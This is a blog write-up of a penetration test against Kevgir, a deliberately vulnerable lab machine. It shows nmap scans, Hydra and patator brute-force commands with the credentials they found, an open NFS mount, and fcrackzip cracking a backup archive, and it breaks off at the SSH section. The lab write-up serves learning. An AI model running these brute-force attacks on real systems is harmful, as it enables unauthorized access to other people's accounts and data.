
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Pwning Kevgir - Core dump overflow</title>
  <meta name="author" content="chousensha">

  
  
  <meta name="description" content="Kevgir writeup">
  <meta name="keywords" content="kevgir, kevgir 1, kevgir vulnhub, vulnhub, pentest lab, hacking lab, ctf, patator, hydra, fcrackzip, redis, jenkins">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://chousensha.github.io/blog/2017/12/02/pwning-kevgir">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-51216602-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Core dump overflow</a></h1>
  
    <h2>Core dump in progress...</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:chousensha.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/where-to-start">Where to start</a></li>
  <li><a href="/book-corner">Book corner</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Pwning Kevgir</h1>
    
    
      <p class="meta">
        








  


<time datetime="2017-12-02T14:08:05-05:00" pubdate data-updated="true">Dec 2<span>nd</span>, 2017</time>
        
           | <a href="#disqus_thread"
             data-disqus-identifier="http://chousensha.github.io">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><p>Kevgir is a machine vulnerable to multiple web application vulnerabilities designed by the <em>canyoupwnme</em> team. So..can we pwn it? Let&rsquo;s see!</p>

<!-- more -->


<p>Nmap results reveal that we&rsquo;ll have lots of targets to attack. So I&rsquo;m going to break the format a little bit, and present the results for each port, along with the ways to hack it.</p>

<h2>Port 25 FTP bruteforce with Hydra</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>25/tcp    open  ftp         vsftpd 3.0.2
</span><span class='line'>|_smtp-commands: SMTP: EHLO 530 Please login with USER and PASS.\x0D</span></code></pre></td></tr></table></div></figure>


<p>Couldn&rsquo;t find exploits for this and no anonymous access, so I tried the bruteforce route. Decided to try some other lists from the myriad available on Kali, and wasn&rsquo;t disappointed when I put Hydra to work:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/mirai_pass.txt ftp://192.168.217.128:25
</span><span class='line'>Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-02 15:08:02
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 16 tasks, 4816 login tries (l:112/p:43), ~301 tries per task
</span><span class='line'>[DATA] attacking ftp://192.168.217.128:25/
</span><span class='line'>[25][ftp] host: 192.168.217.128   login: admin   password: admin</span></code></pre></td></tr></table></div></figure>


<p>I used the credentials to log to the FTP server, but didn&rsquo;t find anything particularly interesting. Let&rsquo;s move on!</p>

<h2>Port 80 phpmyadmin bruteforce with patator</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: Kevgir VM</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="/images/pentest/kevgir/80.jpg" title="port 80" alt="port 80 apache"></p>

<p>Ran Nikto against it and found phpmyadmin running on it. Now I decided to try a new tool to bruteforce the phmyadmin page. Enter Patator!</p>

<h3>patator</h3>

<p>Homepage: <a href="https://github.com/lanjelot/patator">https://github.com/lanjelot/patator</a></p>

<blockquote><p>Patator is a Python multi-purpose brute-forcer, with a modular design and a flexible usage.</p></blockquote>

<p>Let&rsquo;s see the available modules:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Patator v0.6 (http://code.google.com/p/patator/)
</span><span class='line'>Usage: patator module --help
</span><span class='line'>
</span><span class='line'>Available modules:
</span><span class='line'>  + ftp_login     : Brute-force FTP
</span><span class='line'>  + ssh_login     : Brute-force SSH
</span><span class='line'>  + telnet_login  : Brute-force Telnet
</span><span class='line'>  + smtp_login    : Brute-force SMTP
</span><span class='line'>  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
</span><span class='line'>  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
</span><span class='line'>  + finger_lookup : Enumerate valid users using Finger
</span><span class='line'>  + http_fuzz     : Brute-force HTTP
</span><span class='line'>  + pop_login     : Brute-force POP3
</span><span class='line'>  + pop_passd     : Brute-force poppassd (http://netwinsite.com/poppassd/)
</span><span class='line'>  + imap_login    : Brute-force IMAP4
</span><span class='line'>  + ldap_login    : Brute-force LDAP
</span><span class='line'>  + smb_login     : Brute-force SMB
</span><span class='line'>  + smb_lookupsid : Brute-force SMB SID-lookup
</span><span class='line'>  + rlogin_login  : Brute-force rlogin
</span><span class='line'>  + vmauthd_login : Brute-force VMware Authentication Daemon
</span><span class='line'>  + mssql_login   : Brute-force MSSQL
</span><span class='line'>  + oracle_login  : Brute-force Oracle
</span><span class='line'>  + mysql_login   : Brute-force MySQL
</span><span class='line'>  + mysql_query   : Brute-force MySQL queries
</span><span class='line'>  + pgsql_login   : Brute-force PostgreSQL
</span><span class='line'>  + vnc_login     : Brute-force VNC
</span><span class='line'>  + dns_forward   : Forward lookup names
</span><span class='line'>  + dns_reverse   : Reverse lookup subnets
</span><span class='line'>  + snmp_login    : Brute-force SNMP v1/2/3
</span><span class='line'>  + unzip_pass    : Brute-force the password of encrypted ZIP files
</span><span class='line'>  + keystore_pass : Brute-force the password of Java keystore files
</span><span class='line'>  + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes
</span><span class='line'>  + tcp_fuzz      : Fuzz TCP services
</span><span class='line'>  + dummy_test    : Testing module</span></code></pre></td></tr></table></div></figure>


<p>The Github page has examples for various modules. For this case, I assumed the username will be root, and I adapted a password file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat root_userpass.txt | awk '{print $2}' &gt; ~/Desktop/rootpass.txt</span></code></pre></td></tr></table></div></figure>


<p>The original file had lines of the format <em>root password</em>, so I only selected the second field of the passwords and created a new file for patator. Now I needed to learn more about the patator options:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>patator http_fuzz --help
</span><span class='line'>Patator v0.6 (http://code.google.com/p/patator/)
</span><span class='line'>Usage: http_fuzz &lt;module-options ...&gt; [global-options ...]
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  http_fuzz url=http://10.0.0.1/FILE0 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500
</span><span class='line'>  http_fuzz url=http://10.0.0.1/manager/html user_pass=COMBO00:COMBO01 0=combos.txt -x ignore:code=401
</span><span class='line'>  http_fuzz url=http://10.0.0.1/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
</span><span class='line'>
</span><span class='line'>Module options:
</span><span class='line'>  url           : target url (scheme://host[:port]/path?query)
</span><span class='line'>  body          : body data
</span><span class='line'>  header        : use custom headers
</span><span class='line'>  method        : method to use [GET | POST | HEAD | ...]
</span><span class='line'>  auto_urlencode: automatically perform URL-encoding [1|0]
</span><span class='line'>  user_pass     : username and password for HTTP authentication (user:pass)
</span><span class='line'>  auth_type     : type of HTTP authentication [basic | digest | ntlm]
</span><span class='line'>  follow        : follow any Location redirect [0|1]
</span><span class='line'>  max_follow    : redirection limit [5]
</span><span class='line'>  accept_cookie : save received cookies to issue them in future requests [0|1]
</span><span class='line'>  http_proxy    : HTTP proxy to use (host:port)
</span><span class='line'>  ssl_cert      : client SSL certificate file (cert+key in PEM format)
</span><span class='line'>  timeout_tcp   : seconds to wait for a TCP handshake [10]
</span><span class='line'>  timeout       : seconds to wait for a HTTP response [20]
</span><span class='line'>  before_urls   : comma-separated URLs to query before the main request
</span><span class='line'>  before_egrep  : extract data from the before_urls response to place in the main request
</span><span class='line'>  after_urls    : comma-separated URLs to query after the main request
</span><span class='line'>  max_mem       : store no more than N bytes of request+response data in memory [-1 (unlimited)]
</span><span class='line'>  persistent    : use persistent connections [1|0] 
</span><span class='line'>
</span><span class='line'>Global options:
</span><span class='line'>  --version            show program's version number and exit
</span><span class='line'>  -h, --help           show this help message and exit
</span><span class='line'>
</span><span class='line'>  Execution:
</span><span class='line'>    -x arg             actions and conditions, see Syntax below
</span><span class='line'>    --start=N          start from offset N in the wordlist product
</span><span class='line'>    --stop=N           stop at offset N
</span><span class='line'>    --resume=r1[,rN]*  resume previous run
</span><span class='line'>    -e arg             encode everything between two tags, see Syntax below
</span><span class='line'>    -C str             delimiter string in combo files (default is ':')
</span><span class='line'>    -X str             delimiter string in conditions (default is ',')
</span><span class='line'>
</span><span class='line'>  Optimization:
</span><span class='line'>    --rate-limit=N     wait N seconds between tests (default is 0)
</span><span class='line'>    --max-retries=N    skip payload after N failures (default is 4) (-1 for
</span><span class='line'>                       unlimited)
</span><span class='line'>    -t N, --threads=N  number of threads (default is 10)
</span><span class='line'>
</span><span class='line'>  Logging:
</span><span class='line'>    -l DIR             save output and response data into DIR
</span><span class='line'>    -L SFX             automatically save into DIR/yyyy-mm-dd/hh:mm:ss_SFX
</span><span class='line'>                       (DIR defaults to '/tmp/patator')
</span><span class='line'>
</span><span class='line'>  Debugging:
</span><span class='line'>    -d, --debug        enable debug messages
</span><span class='line'>
</span><span class='line'>Syntax:
</span><span class='line'> -x actions:conditions
</span><span class='line'>
</span><span class='line'>    actions    := action[,action]*
</span><span class='line'>    action     := "ignore" | "retry" | "free" | "quit" | "reset"
</span><span class='line'>    conditions := condition=value[,condition=value]*
</span><span class='line'>    condition  := "code" | "size" | "time" | "mesg" | "fgrep" | "egrep" | "clen"
</span><span class='line'>
</span><span class='line'>    ignore      : do not report
</span><span class='line'>    retry       : try payload again
</span><span class='line'>    free        : dismiss future similar payloads
</span><span class='line'>    quit        : terminate execution now
</span><span class='line'>    reset       : close current connection in order to reconnect next time
</span><span class='line'>
</span><span class='line'>    code        : match status code
</span><span class='line'>    size        : match size (N or N-M or N- or -N)
</span><span class='line'>    time        : match time (N or N-M or N- or -N)
</span><span class='line'>    mesg        : match message
</span><span class='line'>    fgrep       : search for string in mesg
</span><span class='line'>    egrep       : search for regex in mesg
</span><span class='line'>    clen        : match Content-Length header (N or N-M or N- or -N)
</span><span class='line'>
</span><span class='line'>For example, to ignore all redirects to the home page:
</span><span class='line'>... -x ignore:code=302,fgrep='Location: /home.html'
</span><span class='line'>
</span><span class='line'> -e tag:encoding
</span><span class='line'>
</span><span class='line'>    tag        := any unique string (eg. T@G or _@@_ or ...)
</span><span class='line'>    encoding   := "url" | "sha1" | "md5" | "hex" | "b64"
</span><span class='line'>
</span><span class='line'>    url         : url encode
</span><span class='line'>    sha1        : hash in sha1
</span><span class='line'>    md5         : hash in md5
</span><span class='line'>    hex         : encode in hexadecimal
</span><span class='line'>    b64         : encode in base64
</span><span class='line'>
</span><span class='line'>For example, to encode every password in base64:
</span><span class='line'>... host=10.0.0.1 user=admin password=_@@_FILE0_@@_ -e _@@_:b64
</span><span class='line'>
</span><span class='line'>Please read the README inside for more examples and usage information.</span></code></pre></td></tr></table></div></figure>


<p>Luckily, on the Github page there is an example of phpmyadmin bruteforcing that I could adapt:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'</span></code></pre></td></tr></table></div></figure>


<p>And we have the password!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>patator http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
</span><span class='line'>17:17:27 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2017-12-02 17:17 EST
</span><span class='line'>17:17:27 patator    INFO -                                                                              
</span><span class='line'>17:17:27 patator    INFO - code size:clen       time | candidate                          |   num | mesg
</span><span class='line'>17:17:27 patator    INFO - -----------------------------------------------------------------------------
</span><span class='line'>17:17:27 patator    INFO - 200  9865:7910      0.366 |                                    |     1 | HTTP/1.1 200 OK
</span><span class='line'>17:17:29 patator    INFO - 200  48618:-1       0.938 | toor                               |    34 | HTTP/1.1 200 OK
</span><span class='line'>17:17:29 patator    INFO - Hits/Done/Skip/Fail/Size: 2/52/0/0/52, Avg: 21 r/s, Time: 0h 0m 2s</span></code></pre></td></tr></table></div></figure>


<p>Inside there are multiple databases, but at this point, I moved on to the next.</p>

<h2>Cracking ZIP archives</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>111/tcp   open  rpcbind     2-4 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      33719/tcp  mountd
</span><span class='line'>|   100005  1,2,3      41291/udp  mountd
</span><span class='line'>|   100021  1,3,4      47439/tcp  nlockmgr
</span><span class='line'>|   100021  1,3,4      60285/udp  nlockmgr
</span><span class='line'>|   100024  1          57769/udp  status
</span><span class='line'>|   100024  1          58840/tcp  status
</span><span class='line'>|   100227  2,3         2049/tcp  nfs_acl
</span><span class='line'>|_  100227  2,3         2049/udp  nfs_acl
</span><span class='line'>2049/tcp  open  nfs_acl     2-3 (RPC #100227)
</span><span class='line'>47439/tcp open  nlockmgr    1-4 (RPC #100021)
</span><span class='line'>48137/tcp open  mountd      1-3 (RPC #100005)
</span><span class='line'>58840/tcp open  status      1 (RPC #100024)
</span><span class='line'>33719/tcp open  mountd      1-3 (RPC #100005)
</span><span class='line'>43866/tcp open  mountd      1-3 (RPC #100005)</span></code></pre></td></tr></table></div></figure>


<p>Alright, there&rsquo;s an NFS here with what appears to be a backup file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>showmount -e 192.168.217.128
</span><span class='line'>Export list for 192.168.217.128:
</span><span class='line'>/backup *</span></code></pre></td></tr></table></div></figure>


<p>I mounted it on my machine and found an archive:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt# mkdir backup
</span><span class='line'>root@kali:/mnt# mount 192.168.217.128:/backup /mnt/backup
</span><span class='line'>ls -la
</span><span class='line'>total 12760
</span><span class='line'>drwxr-xr-x 2 root root     4096 Feb 14  2016 .
</span><span class='line'>drwxr-xr-x 4 root root     4096 Dec  2 17:45 ..
</span><span class='line'>-rw-r--r-- 1 root root 13058028 Feb 14  2016 backup.tar.bz2.zip</span></code></pre></td></tr></table></div></figure>


<p>When I tried unzipping it, I got prompted for a password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unzip backup.tar.bz2.zip 
</span><span class='line'>Archive:  backup.tar.bz2.zip
</span><span class='line'>[backup.tar.bz2.zip] backup.tar.bz2 password:</span></code></pre></td></tr></table></div></figure>


<p>There is an utility that will come just in handy for this, called <strong>fcrackzip</strong>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fcrackzip --help
</span><span class='line'>
</span><span class='line'>fcrackzip version 1.0, a fast/free zip password cracker
</span><span class='line'>written by Marc Lehmann &lt;pcg@goof.com&gt; You can find more info on
</span><span class='line'>http://www.goof.com/pcg/marc/
</span><span class='line'>
</span><span class='line'>USAGE: fcrackzip
</span><span class='line'>          [-b|--brute-force]            use brute force algorithm
</span><span class='line'>          [-D|--dictionary]             use a dictionary
</span><span class='line'>          [-B|--benchmark]              execute a small benchmark
</span><span class='line'>          [-c|--charset characterset]   use characters from charset
</span><span class='line'>          [-h|--help]                   show this message
</span><span class='line'>          [--version]                   show the version of this program
</span><span class='line'>          [-V|--validate]               sanity-check the algortihm
</span><span class='line'>          [-v|--verbose]                be more verbose
</span><span class='line'>          [-p|--init-password string]   use string as initial password/file
</span><span class='line'>          [-l|--length min-max]         check password with length min to max
</span><span class='line'>          [-u|--use-unzip]              use unzip to weed out wrong passwords
</span><span class='line'>          [-m|--method num]             use method number "num" (see below)
</span><span class='line'>          [-2|--modulo r/m]             only calculcate 1/m of the password
</span><span class='line'>          file...                    the zipfiles to crack
</span><span class='line'>
</span><span class='line'>methods compiled in (* = default):
</span><span class='line'>
</span><span class='line'> 0: cpmask
</span><span class='line'> 1: zip1
</span><span class='line'>*2: zip2, USE_MULT_TAB</span></code></pre></td></tr></table></div></figure>


<p>Since the passwords so far have been laughable, I used it in bruteforce mode, but still I was really surprised to get the password instantly:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fcrackzip -b -u -v backup.tar.bz2.zip 
</span><span class='line'>found file 'backup.tar.bz2', (size cp/uc 13057834/13076586, flags 9, chk 28e3)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>PASSWORD FOUND!!!!: pw == aaaaaa</span></code></pre></td></tr></table></div></figure>


<p>From the archive I extracted a html folder filled with what appear to be web applications:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls
</span><span class='line'>dvwa  gentleman  index.html  web-standards  zenphoto</span></code></pre></td></tr></table></div></figure>


<p>I found some passwords inside, but the content was massive. Maybe I will get back to it later, if needed.</p>

<h2>Samba</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
</span><span class='line'>Host script results:
</span><span class='line'>|_nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span><span class='line'>| smb-os-discovery: 
</span><span class='line'>|   OS: Unix (Samba 4.1.6-Ubuntu)
</span><span class='line'>|   Computer name: canyoupwnme
</span><span class='line'>|   NetBIOS computer name: CANYOUPWNME\x00
</span><span class='line'>|   Domain name: 
</span><span class='line'>|   FQDN: canyoupwnme
</span><span class='line'>|_  System time: 2017-12-02T21:15:36+02:00
</span><span class='line'>| smb-security-mode: 
</span><span class='line'>|   account_used: guest
</span><span class='line'>|   authentication_level: user
</span><span class='line'>|   challenge_response: supported
</span><span class='line'>|_  message_signing: disabled (dangerous, but default)
</span><span class='line'>| smb2-security-mode: 
</span><span class='line'>|   2.02: 
</span><span class='line'>|_    Message signing enabled but not required
</span><span class='line'>| smb2-time: 
</span><span class='line'>|   date: 2017-12-02 14:15:37
</span><span class='line'>|_  start_date: 1600-12-31 19:03:58</span></code></pre></td></tr></table></div></figure>


<p>Time to gather some more information with enum4linux. This gave a plethora of info, but to summarize, it found the users: root, admin, user.</p>

<h2>SSH &ndash; privilege escalation</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
